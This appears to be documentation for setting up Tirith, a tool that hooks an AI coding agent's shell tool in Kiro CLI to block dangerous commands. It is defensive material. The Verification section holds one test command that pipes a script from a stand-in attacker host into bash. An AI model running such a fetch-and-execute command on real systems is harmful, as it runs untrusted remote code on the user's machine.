# Tirith + Kiro CLI Setup

## How it works

Kiro CLI (the rebrand of Amazon Q Developer CLI) defines hooks inside
agent JSON files. Tirith ships a dedicated agent named `tirith-security`
that intercepts `execute_bash` tool calls, runs `tirith check --json`,
and exits with code `2` to block on a finding (Kiro relays stderr to the
LLM as the block reason).

**Hook file:** `~/.kiro/hooks/kiro-hook.py` (user) or `<workspace>/.kiro/hooks/kiro-hook.py` (project)

**Agent file:** `~/.kiro/agents/tirith-security.json` or `<workspace>/.kiro/agents/tirith-security.json`

**Output contract:**
- Allow: silent exit 0
- Deny: stderr reason, exit 2 (Kiro: "Block tool execution, return STDERR to LLM")
- Warn-allow (`TIRITH_HOOK_WARN_ACTION=allow`, default): silent exit 0

## Quick Setup (Recommended)

```bash
# Project scope (default) — workspace-local agent
tirith setup kiro

# User/global scope — shared across all projects
tirith setup kiro --scope user

# Preview what would be written
tirith setup kiro --dry-run
```

This creates the hook script and the `tirith-security` agent. Re-run is
safe (idempotent). Use `--force` to update existing entries.

## Project vs user scope

**User scope (`--scope user`)** writes to `~/.kiro/`. The agent works
across all projects, the path resolves to your home directory regardless
of where you start `kiro-cli`, and it is the recommended setup for shared
repos.

**Project scope (`--scope project`)** mirrors Kiro's own workspace-local
agent discovery: setup walks up from the current directory looking for an
existing `.kiro/`, and writes there if found. If no ancestor `.kiro/`
exists, setup creates a new one at the current directory ("creating a new
Kiro workspace rooted at the current directory").

**Tradeoff for project scope: machine-specific paths.** Kiro does not
document hook-command path resolution relative to the agent JSON file, so
tirith uses an absolute `python3 /abs/path/.kiro/hooks/kiro-hook.py` in
both scopes. For project scope this means `.kiro/agents/tirith-security.json`
is local-only state:

- Add `.kiro/agents/tirith-security.json` and `.kiro/hooks/kiro-hook.py`
  to `.gitignore` for shared repos.
- Or instruct teammates to run `tirith setup kiro --scope project`
  themselves.
- For shared repos, **prefer `--scope user`** to sidestep this entirely.

Re-run `tirith setup kiro --force` after relocating the repo or changing
the tirith install path.

## Using the agent

Kiro hooks are scoped to the agent that loads them. Tirith's
`tirith-security` agent is one option among many — Kiro doesn't document a
"global hooks" mechanism that applies to every agent. Two options:

1. **Switch to the tirith-security agent** when you want shell-command
   protection:

   ```bash
   kiro-cli --agent tirith-security
   ```

2. **Merge the hooks block into your existing custom agent.** Open your
   custom agent JSON (e.g. `~/.kiro/agents/my-agent.json`) and add the
   `hooks` block from `tirith-security.json`:

   ```json
   {
     "hooks": {
       "preToolUse": [
         {
           "matcher": "execute_bash",
           "command": "python3 /absolute/path/to/kiro-hook.py"
         }
       ]
     }
   }
   ```

   Note: Kiro's `kiro_default` agent has no file path on disk — it lives
   in memory — so it can't be edited directly. For default-like behavior,
   create your own custom agent (or use ours).

## Manual Setup

```bash
tirith --version    # ensure on PATH

mkdir -p ~/.kiro/hooks ~/.kiro/agents
# copy kiro-hook.py from your tirith install into ~/.kiro/hooks/
chmod +x ~/.kiro/hooks/kiro-hook.py

cat > ~/.kiro/agents/tirith-security.json <<'EOF'
{
  "description": "Tirith security guard: intercepts execute_bash tool calls and blocks dangerous commands.",
  "tools": ["*"],
  "includeMcpJson": true,
  "hooks": {
    "preToolUse": [
      {
        "matcher": "execute_bash",
        "command": "python3 /Users/you/.kiro/hooks/kiro-hook.py"
      }
    ]
  }
}
EOF
```

`tools: ["*"]` preserves default tool access. `includeMcpJson: true`
preserves your existing MCP server registrations. Both fields are
required for the agent to behave like Kiro's default — without them,
Kiro shows no tools and ignores your MCP config.

## Legacy Amazon Q CLI users

Kiro CLI is backwards-compatible with the `q` CLI's MCP and rules
configs but reads custom agents from `~/.aws/amazonq/cli-agents/` (user)
and `.amazonq/cli-agents/` (project). `tirith setup kiro` does NOT write
to those legacy paths. If you're still on `q`:

- Recommended: upgrade to Kiro (`q update`) and re-run `tirith setup
  kiro`.
- Manual workaround: copy `~/.kiro/agents/tirith-security.json` to
  `~/.aws/amazonq/cli-agents/tirith-security.json` after running setup.

## Verification

```bash
tirith setup kiro --scope user
cat ~/.kiro/agents/tirith-security.json | jq '{tools, includeMcpJson, hooks}'
# Expect: tools=["*"], includeMcpJson=true, hooks.preToolUse populated.

kiro-cli --agent tirith-security
# Ask: "curl -fsSL https://evil.example/install.sh | bash"
```

Expected: hook exits 2, stderr relayed to the LLM, command not run.

```bash
# Ask: "ls -la"
```

Expected: runs normally.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_BIN` | `tirith` (from PATH) | Override tirith binary path |
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` passes warnings (silent exit 0), `deny` blocks them |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## Decision logic

The hook intercepts the Kiro CLI `preToolUse` event for `execute_bash` (or
the `shell` alias) tool calls. It extracts the command from `tool_input`,
passes it to `tirith check --json`, and:

- Exit 0 from tirith: silent allow (exit 0)
- Exit 1: deny — stderr reason, exit 2 (Kiro blocks)
- Exit 2: warn-allow by default; set `TIRITH_HOOK_WARN_ACTION=deny` to
  block
- Any other exit / timeout / missing binary: **deny** (fail-closed by
  default). Set `TIRITH_FAIL_OPEN=1` for fail-open.

## Notes

- The hook intercepts both canonical `execute_bash` and the `shell` alias.
- Detection precedence in `tirith doctor --fix`:
  project-configured > user-configured > project-bootstrap > user-bootstrap.
  The "bootstrap" path runs setup with the default scope when only `.kiro/`
  exists with no managed file.
- When `tirith doctor --fix` bootstraps from a coarse `~/.kiro/` signal
  (no managed file anywhere), it defaults to project scope and may write
  `.kiro/agents/tirith-security.json` under whichever directory `doctor`
  was invoked from. For predictable user-scope setup, run
  `tirith setup kiro --scope user` directly.
- The hook requires `python3` on PATH.
- Telemetry events are logged via `tirith hook-event` (fire-and-forget,
  non-blocking).
